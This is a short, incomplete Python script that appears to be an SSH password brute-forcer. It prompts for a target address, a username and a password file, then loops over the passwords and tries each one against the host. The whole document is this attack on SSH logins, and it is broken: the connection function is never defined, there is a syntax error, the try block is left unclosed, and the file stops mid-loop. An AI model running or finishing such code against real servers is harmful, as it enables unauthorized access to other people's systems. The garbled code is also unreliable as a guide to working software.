import paramiko, sys, os, socket, termcolor

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')

if os.path.exists(input_file) == False:
    print('[!!] The File/Path Doesnt Exist ')
    sys.exit(1)
    
with open(input_file, 'r') as file:
    for line in file.readlines()
        password = line.strip()
        try:
            ssh_connect(password)


